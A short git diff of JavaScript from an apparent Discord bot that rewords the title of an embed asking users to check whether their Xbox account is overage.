@@ -30,7 +30,7 @@ const login_embeds = {
     .setFooter({ text: 'Written by TechyGiraffe999', iconURL: 'https://images-ext-1.discordapp.net/external/uVW63D2qclMVEwdF5yp21Fqi7sOmOzNWyRiRiWhTGAM/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/719815864135712799/08a1cc347410b8444f0ef68dc39c17a5.png?width=303&height=303'}),
 
   account_status: new EmbedBuilder()
-    .setTitle("Please check if your account is overage")
+    .setTitle("Is your account overage?")
     .setDescription("Please check if your account is overage or not via this [link](https://account.xbox.com/Settings), if you have the same message as the image below please select ❌")
     .setImage("https://cdn.discordapp.com/attachments/1092414068243046410/1092416692002488511/image.png")
     .setColor("Green")
